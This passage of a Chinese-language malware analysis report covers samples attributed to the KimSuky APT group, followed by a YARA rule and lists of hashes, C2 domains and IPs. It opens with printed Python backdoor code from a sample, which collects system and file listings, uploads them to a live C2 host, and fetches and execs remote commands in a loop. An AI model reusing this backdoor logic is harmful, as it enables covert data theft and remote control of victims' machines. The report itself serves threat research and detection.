    #get systeminfo
    os.system("system_profiler -detailLevel basic &gt;&gt; '" + workdir + "/basic.txt'")
    #get process list
    #os.system("ps -ax &gt;&gt; '" + workdir + "/ps.txt'")
    #get using app list
    os.system("ls -lrS /Applications &gt;&gt; '" + workdir + "/app.txt'")
    #get documents file list
    os.system("ls -lrS '" + home_dir + "/documents' &gt;&gt; '" + workdir + "/documents.txt'")
    #get downloads file list
    os.system("ls -lrS '" + home_dir + "/downloads' &gt;&gt; '" + workdir + "/downloads.txt'")
    #get desktop file list
    os.system("ls -lrS '" + home_dir + "/desktop' &gt;&gt; '" + workdir + "/desktop.txt'")
    #get volumes info
    os.system("ls -lrs /Volumes &gt;&gt; '" + workdir + "/vol.txt'")
    #get logged on user list
    #os.system("w -i &gt;&gt; '" + workdir + "/w_i.txt'")
    #zip gathered informations
    zipname = home_dir + "/../../../Group Containers/UBF8T346G9.Office/backup.zip"
    os.system("rm -f '" + zipname + "'")
    zippass = "doxujoijcs0qei09213@#$@"
    zipcmd = "zip -m -r '" + zipname + "' '" + workdir + "'"
    print(zipcmd)
    os.system(zipcmd)


    try:
        BODY = open(zipname, mode='rb').read()
        headers = `{`"User-Agent" : "Mozilla/5.0 compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/7.0", "Accept-Language" : "en-US,en;q=0.9", "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "Content-Type" : "multipart/form-data; boundary=----7e222d1d50232"`}` ;
        boundary = "----7e222d1d50232";
        postData = "--" + boundary + "\r\nContent-Disposition: form-data; name=""MAX_FILE_SIZE""\r\n\r\n1000000\r\n--" + boundary + "\r\nContent-Disposition: form-data; name=""file""; filename=""1.txt""\r\nContent-Type: text/plain\r\n\r\n" + BODY + "\r\n--" + boundary + "--";
        conn = HTTPConnection("crphone.mireene.com")
        conn.connect()
        conn.request("POST", "/plugin/editor/Templates/upload.php", postData, headers)
        conn.close()

        #delete zipped file
        os.system("rm -f '" + zipname + "'")
    except:
        print "error"



def ExecNewCmd():
    exec(urllib2.urlopen(urllib2.Request('http://crphone.mireene.com/plugin/editor/Templates/filedown.php?name=new')).read())



def SpyLoop():
    while True:
        CollectData()
        ExecNewCmd()
        time.sleep(300)

main_thread = threading.Thread(target=SpyLoop)
main_thread.start()
```

最后的这个python代码起到了一个后门的作用<br>
包括CollectData手机信息，ExecNewCmd执行C2下发的新指令、SpyLoop循环调用。

这里的逻辑其实和最开始分析的powershell后门有异曲同工之妙

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01cd44893bada6e646.png)

另外，此样本中用到的域名，还是和上一类样本相同，属于使用了第三方的托管域名。猜测此类域名在后续的新样本中应该不会沿用。

### <a class="reference-link" name="%E6%A8%A1%E4%BB%BF%E7%B1%BBPE%E5%88%86%E6%9E%90"></a>模仿类PE分析

KimSuky还有一类样本，会模仿正常软件以消除用户的戒备心诱导用户执行。<br>
样本MD5:ae986dd436082fb9a7fec397c8b6e717<br>
样本生成时间：2020年-04-25

该样本是模仿了杀毒软件eset的更新程序：

[![](https://p5.ssl.qhimg.com/t01f9cd25fe1c0d68a6.png)](https://p5.ssl.qhimg.com/t01f9cd25fe1c0d68a6.png)

样本运行后，会弹框提示用户，杀软更新完成，用户计算机目前处于安全状态

[![](https://p0.ssl.qhimg.com/t01ecdbd91d67602538.png)](https://p0.ssl.qhimg.com/t01ecdbd91d67602538.png)

样本运行后，会将自身复制到%appdata%目录下并重命名为:eset_updata.exe

[![](https://p4.ssl.qhimg.com/t01fccc704644aedab4.png)](https://p4.ssl.qhimg.com/t01fccc704644aedab4.png)

此样本会尝试创建一个名为&lt;GoogleUpdate_01&gt;的互斥体

[![](https://p4.ssl.qhimg.com/t011f231f9c12e796a4.png)](https://p4.ssl.qhimg.com/t011f231f9c12e796a4.png)

通过开机自启动Run键值的方式实现本地持久化，此样本写入的键值名是eset_update，路径为移动后的路径

[![](https://p1.ssl.qhimg.com/t0160129942381a854d.png)](https://p1.ssl.qhimg.com/t0160129942381a854d.png)

接着程序将请求的C2地址general-second.org-help.com写入到了屏保相关的注册表键值中：

[![](https://p3.ssl.qhimg.com/t018b4cbb61ac4c6697.png)](https://p3.ssl.qhimg.com/t018b4cbb61ac4c6697.png)

收集本地的一些基本信息，编码之后传到C2服务器

[![](https://p5.ssl.qhimg.com/t0161c255b9416817ba.png)](https://p5.ssl.qhimg.com/t0161c255b9416817ba.png)

接受服务器返回然后使用base64解码：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t016acedc1aec490ba0.png)

然后将解码之后的结果以|拆分，判断是否存在Tiger标志：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01d94c65841c5d500d.png)

除了tiger，在后面的代码中还能看到一些其他动物的标志，如wolf、snake、bear、monkey等，分别对应着不同的远控模块。

### <a class="reference-link" name="%E5%B0%8F%E7%BB%93"></a>小结

此类样本的攻击链比较短，原始样本即为exe文件，exe直接与C2进行通信，执行远控操作，样本就是一个功能完善的远控，似乎并不会从C2下载别的payload继续执行，但是命令分发中也有可能包含了更新指令。

此样本由于模仿了eset的杀软程序，主要迷惑用户的手段就是一个弹框显示。

请求的C2为：general-second.org-help.com，根据该域名，在Twitter上找到了一批同样是被KimSuky使用的子域名

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0188b649499076ec18.png)

域名和对应的解析地址如下<br>
do[.]secure-mail[.]org-help[.]com 213.190.6.57<br>
general-second[.]org-help[.]com 213.190.6.57<br>
finalist[.]org-help[.]com 92.249.44.201<br>
otokar[.]org-help[.]com 92.249.44.201<br>
doosan-manager[.]org-help[.]com 无响应<br>
iamdaum[.]do[.]secure-mail[.]org-help[.]com 213.190.6.57<br>
www[.]org-help[.]com 213.190.6.57<br>
general-first[.]org-help[.]com 213.190.6.57<br>
thisisdaum[.]do[.]secure-mail[.]org-help[.]com 213.190.6.57<br>
apple-shop[.]org-help[.]com 92.249.44.201<br>
iamnaver[.]do[.]secure-mail[.]org-help[.]com 213.190.6.57

和第一部分的域名不同这里解析出来的域名没有到域里面的其他计算机，而是全对应到了两个ip上：<br>
213.190.6.57<br>
和<br>
92.249.44.201

### <a class="reference-link" name="%E5%8F%8C%E6%89%A9%E5%B1%95%E5%90%8D%E7%B1%BBPE%E5%88%86%E6%9E%90"></a>双扩展名类PE分析

样本md5：35d60d2723c649c97b414b3cb701df1c<br>
样本名：베트남 녹지원 상춘재 행사 견적서.hwp .exe<br>
样本创建时间：2019-12-02<br>
样本译名：越南绿地园赏春斋活动报价单.hwp.exe

查阅资料可以得知，19年11月27日，韩国总统文在寅的妻子金正淑在赏春斋和越南总理妻子进行了合影。

[![](https://p1.ssl.qhimg.com/t015afc5e5309024e6a.png)](https://p1.ssl.qhimg.com/t015afc5e5309024e6a.png)

很明显，KimSuky能够比较熟练的将社会工程学应用到APT攻击中。本次投放的样本是双拓展名的诱饵文件，通过在.hwp和.exe之间加入大量空格，隐藏真实的.exe后缀，再加上针对性的文件名，诱导用户双击打开该文件。

[![](https://p3.ssl.qhimg.com/t01206bae4a3720f2ff.png)](https://p3.ssl.qhimg.com/t01206bae4a3720f2ff.png)

样本包含了如下的pdb信息：<br>
E:\pc\makeHwp\Bin\makeHwp.pdb

样本运行后会在temp目录释放一个bat文件用于删除自身

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t017a162528724e2dc3.png)

然后在当前目录创建并打开与原始文件同名的hwp文件用于迷惑用户，降低被发现的几率。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01708f4bb70763c02b.png)

最后在%appdata%目录下释放并加载一个dll文件用于执行后面的恶意操作

原始样本（Dropper）的执行流程如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0135c195953452005c.png)

安装的dll具有设置开机自启动、线程注入、安装插件、收集本地主机信息、上传、下载等功能。

通过Run键值设置开机自启动

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0122fd5ee7ed27aaf2.png)

线程注入

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t018993b90403efc51a.png)

安装dll的执行流程如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t018383bb4969ddc37c.png)

### <a class="reference-link" name="%E5%B0%8F%E7%BB%93"></a>小结

上面提到，Powershell的前置攻击手法至少可以追溯到2019年7月份，而该样本的生成事件是19年年底。也就是说KimSuky一直是在使用这两种攻击方式的，即通过非PE加载最终payload和直接投递双拓展名的exe文件。

此外，本次样本使用的域名是antichrist.or.kr，解析会得到一个韩国的IP： 114.207.244.99，包含了奇怪的请求头：User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko

代码风格方面也与最新的差异比较大，猜测可能出自KimSuky内部不同的小组编写~（这个真是瞎猜）

在此样本中，攻击者似乎还不小心遗留了一个PDB路径：<br>
E:\pc\makeHwp\Bin\makeHwp.pdb

根据该PDB路径进行搜索，找到了如下几个样本信息，其中包含了另外一个pdb路径：<br>
E:\PC\EstService\Bin32\makeHwp.pdb

오성사 MC2-500 외형도 P1307033 Model_수정.pdf(빈공백).exe<br>
DA799D16AED24CF4F8EC62D5048AFD1A<br>
(E:\pc\makeHwp\Bin\makeHwp.pdb)

베트남 녹지원 상춘재 행사 견적서.hwp(빈공백).exe<br>
35D60D2723C649C97B414B3CB701DF1C<br>
(E:\pc\makeHwp\Bin\makeHwp.pdb)

중국-연구자료.hwp(빈공백).scr<br>
20301FDD013C836039B8CFE0D100A1D7<br>
(E:\PC\EstService\Bin32\makeHwp.pdb)

最后在github找到了有关该样本的yara规则，是check了上面提到的奇怪请求头

```
rule APT_NK_Methodology_Artificial_UserAgent_IE_Win7 `{`
    meta:
        author = "Steve Miller aka @stvemillertime"
        description = "Detects hard-coded User-Agent string that has been present in several APT37 malware families."
        hash1 = "e63efbf8624a531bb435b7446dbbfc25"
        score = 45
    strings:
        $a1 = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
        $a2 = `{`4d 6f 7a 69 6c 6c 61 2f 35 2e 30 20 28 57 69 6e 64 6f 77 73 20 4e 54 20 36 2e 31 3b 20 57 4f 57 36 34 3b 20 54 72 69 64 65 6e 74 2f 37 2e 30 3b 20 72 76 3a 31 31 2e 30 29 20 6c 69 6b 65 20 47 65 63 6b 6f 00 00 00 00`}`

        $fp1 = "Esumsoft" wide
        $fp2 = "Acunetix" wide ascii
    condition:
        uint16(0) == 0x5A4D and all of ($a*) and not 1 of ($fp*)
`}`
```



## 0x03 小结

由于笔者精力和经验有限，目前看到的PC端的KimSuky大致就上述几类攻击手法，如有遗漏，望各位大佬多多包涵。也欢迎，感谢各位大佬指正和分享。笔者也会在在之后多多学习总结，争取输出更为完整的分析报告，感谢支持~

目前来看，KimSuky针对PC端主要有以下几种攻击方式（KimSuky在移动端也有比较多的攻击手法，本文中暂时不分析）

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t012859d2d26db2f201.png)

### <a class="reference-link" name="%E9%83%A8%E5%88%86IOC"></a>部分IOC

772a5abc0e946230a50628db4a08dd80<br>
A9DAC36EFD7C99DC5EF8E1BF24C2D747<br>
07d0be79be38ecb8c7b1c80ab0bd8344<br>
8F8AA835E65998DD472D2C641AA82DA5<br>
a4388c4d0588cd3d8a607594347663e0<br>
ae986dd436082fb9a7fec397c8b6e717<br>
35d60d2723c649c97b414b3cb701df1c<br>
d1dfe1e10e1606b99dd7580c0cac05e8<br>
fc6f10e86e64aa349df9187c36665839<br>
c8294148f1d9f268cb4d1fa5cf1c500f<br>
3562042936d0125451dde96cb4e54783<br>
54094084273f46186ee9ac9b207fdab7<br>
db6edf104261faad52291b30c19ba148<br>
5c5bf32736a852c1a1c40d0ae5b8ec33<br>
25998781ca4930f770eeac4aab0f9fab<br>
7f52bcbb695941ebde367f45bc4d4e89<br>
3dca9a5b0e1623a7a816cde7de5a4183<br>
2a5755bf71c10d1b1d5fc9c8446f937f<br>
d452e2e26ee2be4335bf16e9514f1437<br>
12385fb3c5b05426c945c5928253975a<br>
07e8cbcf0b6c8651db24da23816166a5<br>
a4a0003d01d383a4ff11f5449f4be99c

**域名（部分）**

do[.]secure-mail[.]org-help[.]com<br>
general-second[.]org-help[.]com<br>
finalist[.]org-help[.]com<br>
otokar[.]org-help[.]com<br>
doosan-manager[.]org-help[.]com<br>
iamdaum[.]do[.]secure-mail[.]org-help[.]com<br>
www[.]org-help[.]com<br>
general-first[.]org-help[.]com<br>
thisisdaum[.]do[.]secure-mail[.]org-help[.]com<br>
apple-shop[.]org-help[.]com<br>
iamnaver[.]do[.]secure-mail[.]org-help[.]com<br>
pingguo5.atwebpages.com/nu/<br>
attachchosun.atwebpages.com/leess1982/<br>
dongkuiri.atwebpages.com/venus02/venus03/<br>
goldbin.myartsonline.com/le/<br>
pootball.getenjoyment.net/ad/<br>
部分Mireene.com托管域<br>
antichrist.or.kr

**域名解析ip：**

213.190.6.57<br>
92.249.44.201<br>
185.176.43.*
